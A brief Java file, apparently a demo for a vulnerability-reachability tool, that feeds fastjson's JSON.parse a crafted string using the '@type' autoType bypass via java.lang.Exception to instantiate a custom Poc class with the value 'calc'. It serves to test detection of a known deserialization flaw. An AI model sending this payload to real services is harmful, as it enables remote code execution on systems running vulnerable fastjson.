package com.ljqc.vulreach.example;

import com.alibaba.fastjson.JSON;

public class PocDemo {
    public static void main(String[] args) {
        String json = "{\"@type\":\"java.lang.Exception\",\"@type\":\"com.ljqc.vulreach.example.Poc\",\"name\":\"calc\"}";
        JSON.parse(json);
    }
}
